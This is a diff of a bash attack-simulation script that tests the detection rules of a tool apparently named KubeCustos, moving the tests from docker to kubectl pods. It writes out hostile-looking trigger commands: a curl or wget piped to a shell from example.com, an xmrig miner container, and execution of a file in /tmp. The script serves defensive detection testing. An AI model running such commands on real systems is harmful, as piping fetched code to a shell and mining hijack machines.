@@ -1,21 +1,20 @@
 #!/bin/bash
-echo "[*] KubeCustos Attack Simulation Script"
+echo "[*] KubeCustos Attack Simulation Script (for OKE Cluster)"
 
 echo "[+] Testing Rule 1: Crypto Miner Detection (xmrig)"
-# We run this in the background and kill it after a few seconds.
-docker run --rm -d --name miner alpine/xmrig >/dev/null 2>&1
-sleep 5
-docker kill miner >/dev/null 2>&1
-echo "[+] Test complete."
-sleep 1
+# We create a pod that simulates a miner by name
+kubectl run xmrig-test --image=alpine --restart=Never -- /bin/sh -c "echo 'simulating xmrig' && sleep 10"
+sleep 2 # Give time for the execve to be captured
+kubectl delete pod xmrig-test --wait=false
 
-echo "[+] Testing Rule 2: Supply Chain Attack (wget | sh)"
-docker run --rm busybox sh -c "wget -O - example.com | sh" >/dev/null 2>&1
-echo "[+] Test complete."
-sleep 1
+echo "[+] Testing Rule 2: Supply Chain Attack (curl | bash)"
+kubectl run curl-bash-test --image=alpine --restart=Never -- /bin/sh -c "curl -s example.com | bash"
+sleep 2
+kubectl delete pod curl-bash-test --wait=false
 
 echo "[+] Testing Rule 3: Execution from /tmp"
-docker run --rm busybox sh -c "touch /tmp/malware && chmod +x /tmp/malware && /tmp/malware"
-echo "[+] Test complete."
+kubectl run tmp-exec-test --image=alpine --restart=Never -- /bin/sh -c "touch /tmp/malware && chmod +x /tmp/malware && /tmp/malware"
+sleep 2
+kubectl delete pod tmp-exec-test --wait=false
 
 echo "[*] Simulation finished."
